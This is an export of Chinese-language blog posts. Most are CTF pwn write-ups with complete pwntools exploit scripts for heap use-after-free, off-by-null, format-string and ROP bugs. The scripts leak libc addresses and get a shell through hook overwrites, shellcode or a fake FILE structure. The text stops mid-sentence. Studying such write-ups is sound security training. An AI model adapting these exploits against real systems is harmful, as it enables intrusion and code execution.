    <title><![CDATA[2019 Feb pwn writeup]]></title>
    <url>%2F2019%2F02%2F06%2F19-Feb%2F</url>
    <content type="text"><![CDATA[HCTF 2016 fheap [2019.02.05]程序中对在uaf，可以进行double free来造成堆块的重叠。 通过第一次堆块重叠，可以将一个chunk的释放功能的地址改为call puts的地址，从而在delete时调用puts函数进行输出。第二次堆块重叠则用来伪造堆块的大小，使其释放后位于unsorted bin且与前述含有puts函数的堆块重叠。通过分配unsorted bin使得可以通过puts泄漏出libc的基地址。同样的，也可以泄漏出程序的基地址。 但这种方法存在问题：只知道libc基地址而无法知道libc的函数地址。（通过爆破libc版本说不定可以getshell） 不过.got表中存在能够伪造0x70大小chunk的空间，可能可以利用这个和第一次堆块重叠调用puts的方法来把libc泄漏出来。（一个很大的问题就是无法向堆块中写入\x00） 也尝试过调用printf函数来利用格式化字符串漏洞泄漏地址，但是调用时总是会遇到Segmentation Fault。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *def create(p, size, content): p.sendlineafter('quit\n', 'create ') p.sendlineafter('size:', str(size)) p.sendafter('str:', content)def delete(p, idx): p.sendlineafter('quit\n', 'delete ') p.sendlineafter('id:', str(idx)) p.sendlineafter('?:', 'yes')def pwn(): p = process('./pwn-f') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] for i in range(2): create(p, 0x60, 'a' * 0x2) delete(p, 0) delete(p, 1) delete(p, 0) create(p, 2, '\xa0\x00') create(p, 0x100, 'a' * 0x38 + '\x31\x00') create(p, 2, '\xa0\x00') create(p, 10, '\xa0\x00') create(p, 10, 'a' * 8 + '\x1a\x00') create(p, 0x30, 'a' * 0x20 + '\x00') create(p, 0x30, 'a' * 0x20 + '\x00') delete(p, 1) create(p, 0x30, 'a' * 0x8 + '\x31\x00') delete(p, 1) delete(p, 0) delete(p, 1) create(p, 2, '\x10\x00') create(p, 10, 'a' * 8 + '\x31\x00') create(p, 0x30, 'a' * 0x18 + p32(0x211)[:3]) delete(p, 6) create(p, 0x300, 'a' * 19 * 0x8 + p64(0x61)[:2]) create(p, 0x300, 'a' * 9 * 0x8 + p64(0x91)[:2]) delete(p, 0) create(p, 0x300, 'a' * 12 * 0x8 + '\x00') delete(p, 3) gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() 看了官网wp：https://github.com/zh-explorer/hctf2016-fheap/blob/master/poc.py。 它是通过ROP来getshell，在进行delete的时候跳转到gadget强制delete提前返回来达到ROP的目的。利用函数中用于保存用户输入的buf来ROP。 修改后的exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *def create(p, size, content): p.sendlineafter('quit\n', 'create ') p.sendlineafter('size:', str(size)) p.sendafter('str:', content)def delete(p, idx): p.sendlineafter('quit\n', 'delete ') p.sendlineafter('id:', str(idx)) p.sendlineafter('?:', 'yes')def pwn(): p = process('./pwn-f') elf = ELF('./pwn-f') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] for i in range(2): create(p, 0x60, 'a' * 0x2) delete(p, 0) delete(p, 1) delete(p, 0) create(p, 2, '\xa0\x00') create(p, 0x100, 'a' * 0x38 + '\x31\x00') create(p, 2, '\xa0\x00') create(p, 10, '\xa0\x00') create(p, 10, 'a' * 8 + '\x1a\x00') create(p, 0x30, 'a' * 0x20 + '\x00') create(p, 0x30, 'a' * 0x20 + '\x00') delete(p, 1) create(p, 0x30, 'a' * 0x8 + '\x31\x00') delete(p, 1) delete(p, 0) delete(p, 1) create(p, 2, '\x10\x00') create(p, 10, 'a' * 8 + '\x31\x00') create(p, 0x30, 'a' * 0x18 + p32(0x211)[:3]) delete(p, 6) create(p, 0x300, 'a' * 19 * 0x8 + p64(0x61)[:2]) create(p, 0x300, 'a' * 9 * 0x8 + p64(0x91)[:2]) delete(p, 0) create(p, 0x300, 'b' * 10 * 0x8 + '\x00') # 修改12为10 delete(p, 8) # ------------------------------------------ create(p, 0x300, 'a' * 5 * 0x8 + '\x1a\x00') delete(p, 3) p.recvuntil('a' * 3 * 0x8) elf.address = u64(p.recv(6) + '\x00\x00') - (0x55873e14dd1a - 0x55873e14d000) delete(p, 8) ppppr = elf.address + 0x11dc payload = 'a' * 5 * 0x8 + p64(ppppr) create(p, 0x300, payload) bss_addr = elf.address + 0x202800 rdi_ret = elf.address + 0x11e3 p.sendlineafter('quit\n', 'delete ') p.sendlineafter('id:', str(3)) payload = 'yes' + ' ' * 5 + p64(rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) payload += p64(rdi_ret) + p64(elf.got['free']) + p64(elf.plt['puts']) payload += p64(elf.address + 0xc71) p.sendlineafter('?:', payload) recv = p.recvuntil('\x0a', drop=True) libc.address = u64(recv + '\x00\x00') - libc.symbols['puts'] delete(p, 8) payload = 'a' * 2 * 0x8 + '/bin/sh ' + ' ' * 14 + '&amp;&amp;' + p64(libc.symbols['system']) create(p, 0x300, payload) delete(p, 3) # system('/bin/sh &amp;&amp;' + p64(system_addr)) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() DEFCON QUALIFIER 2014 shitsco [2019.02.09]对于我这种逆向渣来说理顺程序逻辑还是花了一点时间Orz。在对set的值进行清除时，如果清除的是第二个变量且保存在.bss上的第一个变量已经被清除时（此时第二个变量的prev值为0，第一个变量的next值为第二个变量的地址），第一个变量的next不会被修改，导致了UAF。只要将第二个变量所在的chunk重新获取并控制其中的内容为保存密码的地址，就能够泄漏密码获得flag。 12345678910111213141516171819202122232425262728293031from pwn import *def pwn(): context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p = process('./shitsco') p.sendlineafter('$ ', 'set a 1') p.sendlineafter('$ ', 'set b 1') p.sendlineafter('$ ', 'set c 1') p.sendlineafter('$ ', 'set d ' + '1' * 0x18) p.sendlineafter('$ ', 'set a') p.sendlineafter('$ ', 'set b') p.sendlineafter('$ ', 'set d') payload = 'set c ' + p32(0x804844A) + p32(0x804c3a0) + p32(0x804c260) p.sendlineafter('$ ', payload) p.sendlineafter('$ ', 'show') p.recvuntil('sleep: ') password = p.recvuntil('\n', drop=True) payload = 'enable ' + password p.sendlineafter('$ ', payload) p.sendlineafter('# ', 'flag') gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() PlaidCTF 2015 Plaiddb(datastore) [2019.02.11]在输入索引的函数中，存在着off-by-null。利用off-by-null进行chunk overlap，然后泄漏libc基地址、利用0x70的chunk修改__malloc_hook的值为one_gadget。 漏洞如下： 12345678910111213141516171819202122232425262728293031323334353637char *read_row_key()&#123; char *chunk; // r12 char *current_dest; // rbx size_t usable_size; // r14 char chr; // al MAPDST signed __int64 offset; // r13 char *new_chunk; // rax chunk = (char *)malloc(8uLL); current_dest = chunk; usable_size = malloc_usable_size(chunk); while ( 1 ) &#123; chr = _IO_getc(stdin); if ( chr == -1 ) EXIT(); if ( chr == '\n' ) // 当offset正好为chunk大小时，break，off-by-null break; offset = current_dest - chunk; if ( usable_size &lt;= current_dest - chunk ) // 空间不够用时 &#123; new_chunk = (char *)realloc(chunk, 2 * usable_size); // 扩大两倍 chunk = new_chunk; if ( !new_chunk ) &#123; puts("FATAL: Out of memory"); exit(-1); &#125; current_dest = &amp;new_chunk[offset]; // 更新两个变量 usable_size = malloc_usable_size(new_chunk); &#125; *current_dest++ = chr; &#125; *current_dest = 0; // off-by-null return chunk;&#125; exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *def get(p, key): p.sendlineafter('command:\n', 'GET') p.sendlineafter('row key:\n', key)def put(p, key, data): p.sendlineafter('command:\n', 'PUT') p.sendlineafter('row key:\n', key) p.sendlineafter('size:\n', str(len(data))) p.sendafter('data:\n', data)def delete(p, key): p.sendlineafter('command:\n', 'DEL') p.sendlineafter('row key:\n', key)def dump(p): p.sendlineafter('command:\n', 'DUMP')def pwn(): p = process('./datastore.elf') elf = ELF('./datastore.elf') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] put(p, '1', 'a' * 0x30) put(p, '2', 'b') put(p, '3', 'c' * 0x30) delete(p, '3') delete(p, '2') delete(p, '1') payload = 'a' * 0x1f0 + p64(0x200) + p64(0x90) payload = payload.ljust(0x280, '\x00') put(p, '1', payload) put(p, '2', 'a' * 0x100) put(p, '3', 'a' * 0x60) delete(p, '1') put(p, '1', 'a' * 0x30) put(p, '4' * 0x18, 'a' * 0x300) # off by null delete(p, 'th3fl4g') put(p, 'th3fl4g', 'a' * 0x110) delete(p, '1') put(p, '1' * 0x20, 'a' * 0x60) delete(p, 'th3fl4g') delete(p, '2') put(p, '2', 'a' * 0x110) get(p, '1' * 0x20) p.recvuntil(']:\n') recv = p.recv(6) libc.address = u64(recv + '\x00\x00') - (0x7fbdacf7cb78 - 0x00007fbdacbb8000) log.info('libc:%s', hex(libc.address)) delete(p, '2') payload = 'a' * 0x110 + p64(0) + p64(0x71) payload += 0x68 * 'a' + p64(0x21) put(p, '2', payload) delete(p, '1' * 0x20) delete(p, '2') payload = 'a' * 0x110 + p64(0) + p64(0x71) + p64(libc.symbols['__malloc_hook'] - 0x13) payload += 0x68 * 'a' + p64(0x21) put(p, '2', payload) put(p, '1' * 0x20, 'a' * 0x60) payload = '\x00' * 3 + p64(libc.address + 0x4526a) payload = payload.ljust(0x60, '\x00') put(p, '5', payload) #gdb.attach(p) p.sendlineafter('command:\n', 'PUT') #getshell p.interactive() p.close()if __name__ == '__main__': pwn() HITCON CTF 2016 Quals ShellingFolder [2019.02.14]在0x1334函数中存在信息泄露和任意地址写的漏洞，泄漏堆栈地址并将__malloc_hook改成one_gadget即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *def list_current(p): p.sendlineafter('choice:', '1')def change_current(p, new_folder): p.sendlineafter('choice:', '2') p.sendlineafter('Folder :', new_folder)def create_folder(p, name): p.sendlineafter('choice:', '3') p.sendafter('Folder:', name)def create_file(p, name, size): p.sendlineafter('choice:', '4') p.sendafter('File:', name) p.sendlineafter('File:', str(size))def remove(p, name): p.sendlineafter('choice:', '5') p.sendlineafter('file :', name)def calc(p): p.sendlineafter('choice:', '6')def pwn(): #context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p = process('./shellingfolder') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') create_file(p, 'sunichi', 0) create_file(p, 'sunichi1', -0x10) create_file(p, 'a' * 0x18 + '\x10', 0x38) remove(p, 'sunichi1') calc(p) p.recvuntil('a' * 0x18) recv = p.recv(6) + '\x00\x00' heap_addr = u64(recv) - 0x10 list_current(p) p.recvuntil('----------------------\n') recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7f5885ba1b78 - 0x7f58857dd000) log.info('libc:%s' % hex(libc.address)) one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] create_folder(p, 'getshell') change_current(p, 'getshell') create_file(p, 'a' * 0x18 + p64(libc.symbols['__malloc_hook'])[:6], 0x0) change_current(p, '..') create_folder(p, 'restore') change_current(p, 'restore') create_file(p, 'a' * 0x18 + p64(heap_addr + 0x10)[:6], 0xd8-0x50) calc(p) change_current(p, '..') remove(p, 'a' * 0x18 + '\x10') create_file(p, 'a' * 0x18 + p64(heap_addr + 0x2cd)[:6], ord(p64(libc.address + one_gadget[2])[5])) calc(p) remove(p, 'a' * 0x18 + p64(heap_addr + 0x2cd)[:6]) for i in range(5): create_file(p, 'a' * 0x18 + p64(heap_addr + 0x2cc - i)[:6], ord(p64(libc.address + one_gadget[2])[4 - i])) calc(p) remove(p, 'a' * 0x18 + p64(heap_addr + 0x2cc - i)[:6]) change_current(p, 'getshell') calc(p) change_current(p, '..') log.info('one_gadget:%s' % hex(libc.address + one_gadget[2])) log.info('heap:%s' % hex(heap_addr)) gdb.attach(p) remove(p, '\x91') # get shell p.interactive() p.close()if __name__ == '__main__': pwn() Boston Key Party 2016 simple-calc-5 [2019.02.15]保存结果时存在复制后栈溢出，可以ROP，但程序静态编译，需要ROP到mprotect将部分内存修改为wx属性来ret2shellcode。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *def add(p, num1, num2): p.sendlineafter('=&gt; ', '1') p.sendlineafter('x: ', str(num1)) p.sendlineafter('y: ', str(num2))def subs(p, num1, num2): p.sendlineafter('=&gt; ', '2') p.sendlineafter('x: ', str(num1)) p.sendlineafter('y: ', str(num2))def set_zero(p): subs(p, 0x2000, 0x2000)def pwn(): p = process('./calc') context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] p.sendlineafter('calculations: ', '100') #gdb.attach(p, gdbscript='b *0x401588') for i in range(0x6): add(p, 0xbead, 0x2000) add(p, 0xbead, 0x2000) set_zero(p) set_zero(p) add(p, 0xbead, 0x2000) add(p, 0xbead, 0x2000) # saved rbp add(p, 0x6c0000, 0x5800) set_zero(p) # pop rdi; ret add(p, 0x400000, 0x1b73) set_zero(p) add(p, 0x6c0000, 0x5000) set_zero(p) # pop rsi; ret add(p, 0x400000, 0x1c87) set_zero(p) add(p, 0x800, 0x800) set_zero(p) # pop rdx; ret add(p, 0x400000, 0x37a85) set_zero(p) subs(p, 0x807, 0x800) set_zero(p) # call mprotect add(p, 0x400000, 0x35690) set_zero(p) # call read # pop rdi; ret add(p, 0x400000, 0x1b73) set_zero(p) set_zero(p) set_zero(p) # pop rsi; ret add(p, 0x400000, 0x1c87) set_zero(p) add(p, 0x6c0000, 0x5e00) set_zero(p) # pop rdx; ret add(p, 0x400000, 0x37a85) set_zero(p) subs(p, 0x900, 0x800) set_zero(p) # call read add(p, 0x400000, 0x34b20) set_zero(p) # ret2shellcode add(p, 0x6c0000, 0x5e00) set_zero(p) p.sendlineafter('=&gt; ', '5') shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" p.sendline(shellcode) p.interactive() p.close()if __name__ == '__main__': pwn() HITCON 2016 babyheap [2019.02.18]NullCON 2019 shop [2019.02.21]use after free漏洞，通过double free可以泄漏got表信息、获取libc。修改__malloc_hook即可getshell。也有wp通过格式化字符串漏洞实现信息泄露。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *def new(p, size, name): p.sendlineafter('&gt; ', '1') p.sendlineafter('length: ', str(size)) p.sendafter('name: ', name) p.sendlineafter('price: ', '17')def delete(p, idx): p.sendlineafter('&gt; ', '2') p.sendlineafter('index: ', str(idx))def view(p): p.sendlineafter('&gt; ', '3')def pwn(): p = process('./challenge') elf = ELF('./challenge') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') new(p, 0x30, '3') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') new(p, 0x60, '/bin/sh') context.terminal = ['tmux', 'split', '-h'] delete(p, 0) delete(p, 1) delete(p, 0) payload = p64(0) + p64(elf.got['puts']) new(p, 0x30, payload) view(p) # get puts address delete(p, 2) delete(p, 0) payload = p64(0) + p64(elf.got['fgets']) new(p, 0x30, payload) # context.log_level='debug' view(p) # get fgets address p.recvuntil('"name": "') p.recvuntil('"name": "') recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7fbe1d061ad0 - 0x00007fbe1cff4000) # get libc log.info('libc:%s' % hex(libc.address)) delete(p, 3) delete(p, 0) new(p, 0x60, '\n') new(p, 0x60, p64(libc.symbols['__malloc_hook'] - 0x13)) new(p, 0x60, '\n') new(p, 0x60, '\n') payload = '\x7f\x00\x00' + p64(libc.address + 0xf02a4) new(p, 0x60, payload) delete(p, 0) # get shell # gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn() NullCON 2019 babypwn [2019.02.28]格式化字符串和有、无符号数的比较两个漏洞。虽然能够溢出，但是程序开启了canary保护，需要想办法规避。看了其他人的wp才知道，对于 1scanf("%d", ...) 来说，如果用户输入字符-或+，scanf函数不会改变相应变量的值。涨知识了。绕过canary后就是常规的格式化字符串漏洞了。 原文： 123This requires knowledge of a cool scanf trick. When scanf is called like so:scanf(&quot;%d&quot;, ...);You can provide the characters - or +, and the scanf will not change the value of the variable.]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Happy 2019 Chinese New Year]]></title>
    <url>%2F2019%2F02%2F05%2Fhappy-2019-chinese-new-year%2F</url>
    <content type="text"><![CDATA[猪年（己亥年）快乐！]]></content>
      <tags>
        <tag>2019</tag>
        <tag>happy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019 Jan pwn writeup]]></title>
    <url>%2F2019%2F01%2F30%2F19-Jan%2F</url>
    <content type="text"><![CDATA[MMACTF 2016 shadow程序的基本功能包括：输入姓名；设定message长度；输入message。共有3次修改姓名和message的机会。 程序中实现了一个影子栈及pop、push、call和ret的函数，使得无法覆盖调用ret进行返回的函数的返回地址。在进行函数调用时，未被保护到的函数为程序调用的libc中的函数，这些函数仍然执行汇编指令ret进行返回而不是程序自行实现的ret函数。 利用无符号数的转换来泄漏canary和libc地址。由于name的地址保存在栈上，通过输入的漏洞可以覆盖该地址为_environ地址来泄漏栈地址。用于记录剩余输入次数的变量也保存在栈上。在修改name前，把name指向read函数的返回地址（libc中的函数没有得到ret函数的保护），使得在修改name时能够控制程序执行流来getshell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# coding=utf-8from pwn import *def pwn(): BIN_PATH = './shadow' DEBUG = 1 context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') # leak canary p.recvuntil('name : ') p.sendline('sunichi') p.recvuntil('length : ') p.sendline('-1') p.sendafter('message : ', 'a' * 33) p.recvuntil('a' * 33) canary = '\x00' + p.recv(3) # leak libc p.sendlineafter('(y/n) :', 'n') p.recvuntil('length : ') p.sendline('-1') payload = 'a' * 41 p.sendafter('message : ', payload) p.recvuntil(payload) recv = '\x00' + p.recv(3) recv = u32(recv) print hex(recv) libc.address = recv - (0xf76f3000 - 0xf7541000) print hex(libc.address) # leak stack address p.sendlineafter('(y/n) :', 'n') p.recvuntil('length : ') p.sendline('-1') payload = 'a' * 0x20 + canary + 'a' * 8 + p32(0) + p32(0) payload += p32(libc.symbols['_environ']) + p32(0x0804a800) + p32(100) p.sendafter('message : ', payload) p.recvuntil(') &lt;') stack_addr = u32(p.recv(4)) print hex(stack_addr) # attack p.sendlineafter('(y/n) :', 'n') p.recvuntil('length : ') p.sendline('-1') payload = 'a' * 0x20 + canary + 'a' * 8 + p32(0) + p32(0) payload += p32(stack_addr - (0x98c-0x7bc)) + p32(0x0804a800) + p32(100) p.sendafter('message : ', payload) payload = p32(libc.symbols['system']) + p32(0x0804a800) + p64(next(libc.search('/bin/sh'))) p.sendafter('name : ', payload) p.interactive() p.close()if __name__ == '__main__': pwn() Insomni’hack 2018 GoGoGadgetCopter输入内容时调用的read函数，可以用来泄漏地址。Gadget的scanf函数导致off-by-null，可用来制造堆块重叠。利用House of Orange来getshell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238from pwn import *_IO_FILE_plus_size = &#123; 'i386': 0x98, 'amd64': 0xe0&#125;_IO_FILE_plus = &#123; 'i386': &#123; 0x0: '_flags', 0x4: '_IO_read_ptr', 0x8: '_IO_read_end', 0xc: '_IO_read_base', 0x10: '_IO_write_base', 0x14: '_IO_write_ptr', 0x18: '_IO_write_end', 0x1c: '_IO_buf_base', 0x20: '_IO_buf_end', 0x24: '_IO_save_base', 0x28: '_IO_backup_base', 0x2c: '_IO_save_end', 0x30: '_markers', 0x34: '_chain', 0x38: '_fileno', 0x3c: '_flags2', 0x40: '_old_offset', 0x44: '_cur_column', 0x46: '_vtable_offset', 0x47: '_shortbuf', 0x48: '_lock', 0x4c: '_offset', 0x54: '_codecvt', 0x58: '_wide_data', 0x5c: '_freeres_list', 0x60: '_freeres_buf', 0x64: '__pad5', 0x68: '_mode', 0x6c: '_unused2', 0x94: 'vtable' &#125;, 'amd64': &#123; 0x0: '_flags', 0x8: '_IO_read_ptr', 0x10: '_IO_read_end', 0x18: '_IO_read_base', 0x20: '_IO_write_base', 0x28: '_IO_write_ptr', 0x30: '_IO_write_end', 0x38: '_IO_buf_base', 0x40: '_IO_buf_end', 0x48: '_IO_save_base', 0x50: '_IO_backup_base', 0x58: '_IO_save_end', 0x60: '_markers', 0x68: '_chain', 0x70: '_fileno', 0x74: '_flags2', 0x78: '_old_offset', 0x80: '_cur_column', 0x82: '_vtable_offset', 0x83: '_shortbuf', 0x88: '_lock', 0x90: '_offset', 0x98: '_codecvt', 0xa0: '_wide_data', 0xa8: '_freeres_list', 0xb0: '_freeres_buf', 0xb8: '__pad5', 0xc0: '_mode', 0xc4: '_unused2', 0xd8: 'vtable' &#125;&#125;class IO_FILE_plus_struct(dict): arch = None endian = None fake_file = None size = 0 FILE_struct = [] @LocalContext def __init__(self): self.arch = context.arch self.endian = context.endian if self.arch != 'i386' and self.arch != 'amd64': log.error('architecture not supported!') success('arch: '+str(self.arch)) self.FILE_struct = [_IO_FILE_plus[self.arch][i] for i in sorted(_IO_FILE_plus[self.arch].keys())] print self.FILE_struct self.update(&#123;r: 0 for r in self.FILE_struct&#125;) self.size = _IO_FILE_plus_size[self.arch] def __setitem__(self, item, value): if item not in self.FILE_struct: log.error("Unknown item %r (not in %r)" % (item, self.FILE_struct)) super(IO_FILE_plus_struct, self).__setitem__(item, value) def __setattr__(self, attr, value): if attr in IO_FILE_plus_struct.__dict__: super(IO_FILE_plus_struct, self).__setattr__(attr, value) else: self[attr] = value def __getattr__(self, attr): return self[attr] def __str__(self): fake_file = "" with context.local(arch=self.arch): for item_offset in sorted(self.item_offset): if len(fake_file) &lt; item_offset: fake_file += "\x00"*(item_offset - len(fake_file)) fake_file += pack(self[_IO_FILE_plus[self.arch] [item_offset]], word_size='all') fake_file += "\x00"*(self.size - len(fake_file)) return fake_file @property def item_offset(self): return _IO_FILE_plus[self.arch].keys()def Create(p, content): p.sendlineafter('Go Go Gadget: ', str(1)) p.sendlineafter('Gadget :', content) if len(content) == 0xa8: p.recvuntil('Go Go Gadget: ')def Delete(p, idx): p.sendlineafter('Go Go Gadget: ', str(2)) p.sendlineafter('Gadget [id] :', str(idx))def GoGoGadget(p, idx): p.sendlineafter('Go Go Gadget: ', str(3)) p.sendlineafter('Gadget [idx] :', str(idx))def Active(p, speed, content): p.sendlineafter('Go Go Gadget: ', str(4)) p.sendlineafter('Speed :', str(speed)) p.sendafter('Destination :', content)def Deactive(p): p.sendlineafter('Go Go Gadget: ', str(5))def GoGoCopter(p): p.sendlineafter('Go Go Gadget: ', str(6))def pwn(): BIN_PATH = './gogogadget' context.arch = 'amd64' p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') Create(p, 'sunichi') Create(p, p64(0x60) * (0xa0 / 8)) Create(p, p64(0x60) * (0xa0 / 8)) Create(p, 'sunichi') Create(p, 'sunichi') Delete(p, 0) Delete(p, 1) Delete(p, 2) Delete(p, 3) payload = 'a' * 0xa0 + p64(0xb0) Create(p, payload) p.recvuntil('Wrong input !') payload = 'a' * 0xa0 + p64(0xb0)[:7] Create(p, payload) Active(p, 0, '\x78') GoGoCopter(p) p.recvuntil('Gogo Copter To: ') recv = p.recv(6) arena_88_addr = u64(recv.ljust(8, '\x00')) libc.address = arena_88_addr - (0x7efee8b41b78 - 0x00007efee877d000) Delete(p, 1) Delete(p, 4) Create(p, 'sunichi') Create(p, 'sunichi') Create(p, 'sunichi') Create(p, 'sunichi') Delete(p, 1) Delete(p, 3) GoGoCopter(p) p.recvuntil('Gogo Copter To: ') recv = p.recv(6) heap_addr = u64(recv.ljust(8, '\x00')) fake_file = IO_FILE_plus_struct() fake_file._flags = u64('/bin/sh\x00') fake_file._IO_read_ptr = 0x61 fake_file._IO_read_base = 0x7fffffffffff-0x10 fake_file._IO_write_base = 0 fake_file._IO_write_ptr = 1 fake_file._mode = 0 fake_file.vtable = heap_addr - 80 payload = p64(0) * 2 + p64(libc.symbols['system']) * 3 payload = payload.ljust(0x50, '\x00') + '/bin/sh\x00' + p64(0xf1)[:2] Create(p, payload) payload = p64(0) + p64(0) + p64(0) + p64(1) + '\x00' * 0x21 Create(p, payload) Delete(p, 4) Create(p, str(fake_file)[0x70:0xc8] + p64(0x51) + p64(0) * 3 + p64(heap_addr - 80)) Delete(p, 1) Delete(p, 3) payload = p64(0) + p64(1) + p64(2) + p64(libc.symbols['system']) payload = payload.ljust(0x50, '\x00') + '/bin/sh\x00' + p64(0x61) payload += p64(libc.address + (0x7ffff7dd1b78 - 0x7ffff7a0d000)) + p64(libc.symbols['_IO_list_all'] - 0x10) payload += p64(0x30) + p64(0x40) Create(p, payload) print hex(heap_addr) print hex(arena_88_addr) print hex(libc.address) gdb.attach(p) p.interactive() p.close()if __name__ == "__main__": pwn()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BCTF 2018 pwn writeup]]></title>
    <url>%2F2019%2F01%2F13%2Fbctf18-pwn%2F</url>
    <content type="text"><![CDATA[easiest通过double free修改got项到程序中的getshell函数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# coding=utf-8from pwn import *def Add(p, idx, size, content): p.sendlineafter('delete \n', str(1)) p.sendlineafter('(0-11):', str(idx)) p.sendlineafter('Length:', str(size)) p.sendlineafter('C:', content)def Delete(p, idx): p.sendlineafter('delete \n', str(2)) p.sendlineafter('(0-11):', str(idx))def pwn(): BIN_PATH = './easiest' DEBUG = 1 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('39.96.9.148', 9999) elf = ELF(BIN_PATH) context.log_level = 'debug' Add(p, 0, 0x68, 'sunichi') Add(p, 1, 0x68, 'sunichi') Add(p, 2, 0x100, 'sunichi') Add(p, 3, 0x100, 'sunichi') Delete(p, 0) Delete(p, 1) Delete(p, 0) Delete(p, 2) Add(p, 0, 0x68, p64(0x602045)) Add(p, 1, 0x68, 'sunichi') Add(p, 2, 0x68, 'sunichi') payload = '\x00\x00\x00' + p64(0x400946) * 6 Add(p, 3, 0x68, payload) gdb.attach(p) raw_input() p.interactive() p.close()if __name__ == '__main__': pwn() hardcore_fmt利用%a泄漏mmap的地址，然后通过向前偏移泄漏canary，接着通过one_gadget（同样通过前向偏 移计算libc基地址）拿到shell。 本地和服务器偏移不一致，需要轻度爆破。 C99 %a：Hexadecimal floating point, lowercase. (-0xc.90fep-2) 后来调试了一下，输出的地址是在printf_chk执行过程中压入到栈中的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# coding=utf-8from pwn import *def pwn(): BIN_PATH = './hardcore_fmt' DEBUG = 0 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') f = open('/proc/'+str(pidof(p)[0])+'/maps') data = f.read().split('\n') f.close() for j in data: if 'hardcore_fmt' in j: elf.address = int('0x' + j[0:12], 16) else: p = remote('39.106.110.69', 9999) elf = ELF(BIN_PATH) libc = ELF('./libc-2.27.so') context.log_level = 'debug' if DEBUG == 1: gdb.attach(p) raw_input() p.sendline('%a%2$a%3$a') p.recvuntil('0x0.0') p.recvuntil('0x0.0') recv = p.recv(10) + '00' if DEBUG == 1: p.sendline(str(int(recv, 16) - 35800 + 1)) else: p.sendline(str(int(recv, 16) - 41216 + 0x1000 * 6 + 0x1529)) p.recvuntil(': ') canary = '\x00' + p.recv(7) libc_base = int(recv, 16) - 6398208 print hexdump(canary) print hex(int(recv, 16)) raw_input() p.sendline('a' * 0x108 + canary + p64(0) + p64(0) + p64(int(recv, 16)) + p64(libc_base + 0x4f322)) p.interactive() p.close()if __name__ == '__main__': pwn() SOS原理参考这篇⽂章：https://blogs.msmvps.com/gdicanio/2016/11/17/the-small-string-optimization/ 也是SECCON 2018 CTF的⼀道题的出题点。在C++中，当⼀个string对象较⼩时，为 